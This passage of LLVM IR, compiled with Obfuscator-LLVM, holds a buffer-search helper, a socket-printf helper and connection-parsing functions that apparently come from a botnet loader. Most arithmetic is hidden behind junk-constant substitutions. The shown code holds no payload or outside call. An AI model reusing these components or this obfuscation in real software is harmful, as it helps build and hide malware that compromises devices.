  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.41, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %31

; <label>:16:                                     ; preds = %1
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 15
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i32 0, i32 0
  %20 = load i32, i32* %4, align 4
  %21 = call i32 @util_memsearch(i8* %19, i32 %20, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.42, i32 0, i32 0), i32 14)
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %25

; <label>:23:                                     ; preds = %16
  %24 = load i32, i32* %4, align 4
  store i32 %24, i32* %2, align 4
  br label %31

; <label>:25:                                     ; preds = %16
  %26 = load i32, i32* %4, align 4
  %27 = add i32 255, 1166396967
  %28 = add i32 %27, %26
  %29 = sub i32 %28, 1166396967
  %30 = add nsw i32 255, %26
  store i32 %29, i32* %2, align 4
  br label %31

; <label>:31:                                     ; preds = %25, %23, %15
  %32 = load i32, i32* %2, align 4
  ret i32 %32
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_cleanup(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %18

; <label>:16:                                     ; preds = %1
  %17 = load i32, i32* %4, align 4
  store i32 %17, i32* %2, align 4
  br label %18

; <label>:18:                                     ; preds = %16, %15
  %19 = load i32, i32* %2, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %59

; <label>:16:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

; <label>:17:                                     ; preds = %52, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %50

; <label>:35:                                     ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = sub i32 %36, 1070052436
  %38 = add i32 %37, 1
  %39 = add i32 %38, 1070052436
  %40 = add nsw i32 %36, 1
  store i32 %39, i32* %11, align 4
  %41 = load i32, i32* %9, align 4
  %42 = icmp eq i32 %39, %41
  br i1 %42, label %43, label %49

; <label>:43:                                     ; preds = %35
  %44 = load i32, i32* %10, align 4
  %45 = sub i32 %44, 1869586355
  %46 = add i32 %45, 1
  %47 = add i32 %46, 1869586355
  %48 = add nsw i32 %44, 1
  store i32 %47, i32* %5, align 4
  br label %59

; <label>:49:                                     ; preds = %35
  br label %51

; <label>:50:                                     ; preds = %21
  store i32 0, i32* %11, align 4
  br label %51

; <label>:51:                                     ; preds = %50, %49
  br label %52

; <label>:52:                                     ; preds = %51
  %53 = load i32, i32* %10, align 4
  %54 = sub i32 %53, 2063912788
  %55 = add i32 %54, 1
  %56 = add i32 %55, 2063912788
  %57 = add nsw i32 %53, 1
  store i32 %56, i32* %10, align 4
  br label %17

; <label>:58:                                     ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %59

; <label>:59:                                     ; preds = %58, %43, %15
  %60 = load i32, i32* %5, align 4
  ret i32 %60
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i8, align 1
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca [4098 x i8], align 16
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %4, align 4
  store i8* %1, i8** %5, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %10 = bitcast %struct.__va_list_tag* %9 to i8*
  call void @llvm.va_start(i8* %10)
  %11 = getelementptr inbounds [4098 x i8], [4098 x i8]* %6, i32 0, i32 0
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %14 = call i32 @vsnprintf(i8* %11, i64 4096, i8* %12, %struct.__va_list_tag* %13) #5
  store i32 %14, i32* %8, align 4
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = bitcast %struct.__va_list_tag* %15 to i8*
  call void @llvm.va_end(i8* %16)
  %17 = load i32, i32* %8, align 4
  %18 = icmp sgt i32 %17, 0
  br i1 %18, label %19, label %34

; <label>:19:                                     ; preds = %2
  %20 = load i32, i32* %8, align 4
  %21 = icmp sgt i32 %20, 4096
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19
  store i32 4096, i32* %8, align 4
  br label %23

; <label>:23:                                     ; preds = %22, %19
  %24 = load i32, i32* %4, align 4
  %25 = getelementptr inbounds [4098 x i8], [4098 x i8]* %6, i32 0, i32 0
  %26 = load i32, i32* %8, align 4
  %27 = sext i32 %26 to i64
  %28 = call i64 @send(i32 %24, i8* %25, i64 %27, i32 16384)
  %29 = load i32, i32* %8, align 4
  %30 = sext i32 %29 to i64
  %31 = icmp ne i64 %28, %30
  br i1 %31, label %32, label %33

; <label>:32:                                     ; preds = %23
  store i8 0, i8* %3, align 1
  br label %35

; <label>:33:                                     ; preds = %23
  br label %34

; <label>:34:                                     ; preds = %33, %2
  store i8 1, i8* %3, align 1
  br label %35

; <label>:35:                                     ; preds = %34, %32
  %36 = load i8, i8* %3, align 1
  ret i8 %36
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: nounwind
declare i32 @vsnprintf(i8*, i64, i8*, %struct.__va_list_tag*) #1

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readonly }

!llvm.ident = !{!0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
